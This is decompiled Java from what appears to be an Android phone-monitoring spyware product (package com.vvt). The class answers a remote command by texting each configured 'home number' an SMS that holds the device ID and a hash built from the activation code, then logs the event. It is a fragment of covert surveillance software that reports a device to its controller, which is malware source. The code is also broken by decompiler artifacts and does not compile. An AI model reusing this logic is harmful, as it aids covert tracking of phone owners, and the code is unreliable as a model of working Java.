package com.vvt.appengine.a;

import com.vvt.ae.f;
import com.vvt.appengine.AppEngine1;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.k.e;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefHomeNumber;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class bi
{
  private static final boolean a = com.vvt.ak.a.a;
  private AppEngine1 b;
  private com.vvt.base.a c;
  
  public bi(AppEngine1 paramh, com.vvt.base.a parama)
  {
    this.b = paramh;
    this.c = parama;
  }
  
  private void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    FxSystemEvent localFxSystemEvent = new com/vvt/events/FxSystemEvent;
    localFxSystemEvent.<init>();
    Object localObject = FxEventDirection.OUT;
    localFxSystemEvent.setDirection((FxEventDirection)localObject);
    long l = System.currentTimeMillis();
    localFxSystemEvent.setEventTime(l);
    localObject = FxSystemEventCategories.CATEGORY_PHONE_NUMBER_UPDATE_HOME_IN;
    localFxSystemEvent.setLogType((FxSystemEventCategories)localObject);
    localFxSystemEvent.setMessage(paramString);
    localObject = new java/util/ArrayList;
    ((ArrayList)localObject).<init>();
    ((List)localObject).add(localFxSystemEvent);
    this.c.a((List)localObject);
  }
  
  private String b()
  {
    String str1 = this.b.l.d();
    String str2 = this.b.k.a().getActivationCode();
    Object localObject = com.vvt.base.a.b.a(com.vvt.base.a.a.p);
    String str3 = e.a("3", str1, str2, (String)localObject);
    localObject = new Object[2];
    localObject[0] = str1;
    localObject[1] = str3;
    return String.format("<3><%s><%s>", (Object[])localObject);
  }
  
  public RmtCtrlOutputStatusMessage a()
  {
    int i;
    String str;
    boolean bool1;
    try
    {
      Object localObject1 = this.b;
      localObject1 = ((AppEngine1)localObject1).n;
      localObject4 = FxPreferenceType.HOME_NUMBER;
      localObject1 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject4);
      localObject1 = (PrefHomeNumber)localObject1;
      localObject1 = ((PrefHomeNumber)localObject1).getList();
      i = ((List)localObject1).size();
      if (i <= 0) {
        break label187;
      }
      str = "Report mobile number SMS is sent successfully";
      localObject4 = b();
      Iterator localIterator = ((List)localObject1).iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = localIterator.next();
        localObject1 = (String)localObject1;
        boolean bool2 = a;
        if (bool2) {}
        Object localObject5 = this.b;
        localObject5 = ((AppEngine1)localObject5).c;
        ((f)localObject5).a((String)localObject1, (String)localObject4);
      }
      bool1 = true;
    }
    finally
    {
      localObject4 = new com/vvt/remotecontrol/RemoteControlException;
      localObject3 = ((Throwable)localObject2).getMessage();
      ((RemoteControlException)localObject4).<init>((String)localObject3);
    }
    Object localObject6 = localObject4;
    Object localObject4 = str;
    boolean bool3 = bool1;
    Object localObject3 = localObject6;
    for (;;)
    {
      boolean bool4 = a;
      if (bool4) {}
      a((String)localObject3);
      localObject3 = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
      ((RmtCtrlOutputStatusMessage)localObject3).<init>();
      ((RmtCtrlOutputStatusMessage)localObject3).setSuccess(bool3);
      ((RmtCtrlOutputStatusMessage)localObject3).setMessage((String)localObject4);
      return (RmtCtrlOutputStatusMessage)localObject3;
      label187:
      localObject3 = "No home number";
      i = 0;
      bool3 = false;
      str = null;
      localObject4 = localObject3;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bi.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */